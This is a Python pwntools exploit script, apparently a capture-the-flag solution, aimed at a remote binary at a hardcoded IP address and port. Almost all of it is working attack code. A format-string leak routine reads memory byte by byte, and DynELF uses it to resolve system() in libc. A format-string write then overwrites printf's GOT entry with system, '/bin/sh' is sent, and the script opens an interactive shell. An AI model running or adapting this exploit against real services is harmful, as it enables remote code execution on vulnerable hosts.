from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "106.75.126.184"
remote_port = 58579

local_addr = "127.0.0.1"
local_port = 1807

pc = "./pwn"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 1 #0 for no,1 for i386,2 for x64
local = 0
haslibc = 0
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = False

if local:
	if atta:
		gdb.attach(p,'b *0x80485c0')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)
def sl(a):
	p.sendline(a)

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def leak(address):
	data = ''
	
	# the first byte
	payload = '%9$saaaa'.ljust(0xc,'\x00')
	payload += p32(address)
	payload = payload.ljust(0x63,'\x00')
	sl(payload)
	tmp_data = rv(4)
	if tmp_data == 'aaaa':
		tt = rv(1)
		if tt == '\n':
			data += '\x00'
		elif tt == 'a':
			data += 'a'
			rv(1)
		else:
			data += 'a'
			ru('aaaa')
			rv(1)
	else:
		if tmp_data[0] != 'a' and tmp_data[1] != 'a' and tmp_data[2] != 'a' and tmp_data[3] != 'a':
			data = tmp_data
			ru('a\n')
			print "%#x => %s" % (address, (data or '').encode('hex'))
			return data

		data += tmp_data[0]
		ru('a\n')
	#sleep(0.1)

	# the second byte
	payload = '%9$saaa'.ljust(0xc,'\x00')
	payload += p32(address+1)
	payload = payload.ljust(0x63,'\x00')
	sl(payload)
	tmp_data = rv(3)
	if tmp_data == 'aaa':
		tt = rv(1)
		if tt == '\n':
			data += '\x00'
		elif tt == 'a':
			data += 'a'
			rv(1)
		else:
			data += 'a'
			ru('aaa')
			rv(1)
	else:
		if tmp_data[0] != 'a' and tmp_data[1] != 'a' and tmp_data[2] != 'a':
			data += tmp_data[0:3]
			ru('a\n')
			print "%#x => %s" % (address, (data or '').encode('hex'))
			return data
		data += tmp_data[0]
		ru('a\n')
	#sleep(0.1)

	# the third byte
	payload = '%9$saa'.ljust(0xc,'\x00')
	payload += p32(address+2)
	payload = payload.ljust(0x63,'\x00')
	sl(payload)
	tmp_data = rv(2)
	if tmp_data == 'aa':
		tt = rv(1)
		if tt == '\n':
			data += '\x00'
		elif tt == 'a':
			data += 'a'
			rv(1)
		else:
			data += 'a'
			ru('aa')
			rv(1)
	else:
		if tmp_data[0] != 'a' and tmp_data[1] != 'a':
			data += tmp_data[0:2]
			ru('a\n')
			print "%#x => %s" % (address, (data or '').encode('hex'))
			return data

		data += tmp_data[0]
		ru('a\n')
	#sleep(0.1)

	# the forth byte
	payload = '%9$sa'.ljust(0xc,'\x00')
	payload += p32(address+3)
	payload = payload.ljust(0x63,'\x00')
	sl(payload)
	tmp_data = rv(1)
	if tmp_data == 'a':
		tt = rv(1)
		if tt == '\n':
			data += '\x00'
		elif tt == 'a':
			data += 'a'
			rv(1)
		else:
			data += 'a'
			ru('a')
			rv(1)
	else:
		data += tmp_data[0]
		ru('a\n')
	#sleep(0.1)
	# if tmp_data[0] != 'a':
	# 	data += tmp_data[0]
	# 	if tmp_data[1] != 'a':
	# 		data += tmp_data[1]
	# 		if tmp_data[2] != 'a':
	# 			data += tmp_data[2]
	# 			if tmp_data[3] != 'a':
	# 				data += tmp_data[3]
	# 				ru('aaaa')
	# 			else:
	# 				t1 = rv(1)
	# 				t2 = rv(2)
	# 				t3 = rv(3)
	# 				tt = t1 + t2 + t3
	# 				if tt == 'aaa':
	# 					data += '\x00'
	# 				else:
	# 					data += 'a'
	# 					ru('aaaa')
	# 		else:
	# 			t1 = rv(1)
	# 			t2 = rv(2)
	# 			tt = tmp_data[3] + t1 + t2
	# 			if tt == 'aaa':
	# 				data += '\x00'
	# 				rv(1)
	# 				payload = '%9$4saaaa'.ljust(0xc,'\x00')
	# 				payload += p32(address+3)
	# 				payload = payload.ljust(0x63,'\x00')
	# 				sl(payload)

	# 				t_data = rv(4)
	# 				if t_data == 'aaaa':
	# 					data += '\x00'
	# 				else:
	# 					data += t_data[0]


	# if tmp_data == 'aaaa':
	# 	data = '\x00\x00\x00\x00'
	# elif tmp_data
	# rv(1)
	
	# if tmp_data
	# if data == '\x20\x20\x20\x20':
	# 	data = '\x00'
	# 	payload = '%8$3.3s'.ljust(8,'\x00')
	# 	payload += p32(address+1)
	# 	payload = payload.ljust(0x63,'\x00')
	# 	sl(payload)

	# 	tmp_data = rv(3)
	# 	if tmp_data[2] != '\x20':
	# 		data += tmp_data[2]
	# 	elif tmp_data[1] != '\x20':



	# 	data = '\x00\x00\x00\x00'
	# elif data[0] == '\x20' and data[1] == '\x20' and data[2] == '\x20':
	# 	data = data[3] + '\x00'*3 
	# elif data[0] == '\x20' and data[1] == '\x20':
	# 	data = data[2] + data[3] + '\x00'*2

	print "%#x => %s" % (address, (data or '').encode('hex'))
	return data

def hack():
	# set_buf_got = pwn_elf.got['setbuf']
	# puts_got = pwn_elf.got['puts']
	printf_got = pwn_elf.got['printf']
	# payload = '%8$04s'.ljust(8,'\x00')
	# payload += p32(puts_got)
	# payload = payload.ljust(0x64,'\x00')
	# sa('repeater?\n',payload)
	# print rv(4)
	#ru('repeater?\n')
	ru('\n')
	d = DynELF(leak, elf=ELF('./pwn'))
	system_addr = d.lookup('system', 'libc')
	lg('system_addr',system_addr)

	#raw_input()

	payload = fmtstr_payload(6,{printf_got:system_addr})
	payload = payload.ljust(0x63,'\x00')
	sl(payload)

	payload = '/bin/sh\0'
	sl(payload)
	# set_buf_got = pwn_elf.got['setbuf']
	# puts_got = pwn_elf.got['puts']

	# payload = '%8$.4s'.ljust(8,'\x00')
	# payload += p32(set_buf_got)
	# payload = payload.ljust(0x64,'\x00')
	# sla('repeater?\n',payload)
	
	

	
	p.interactive()
hack()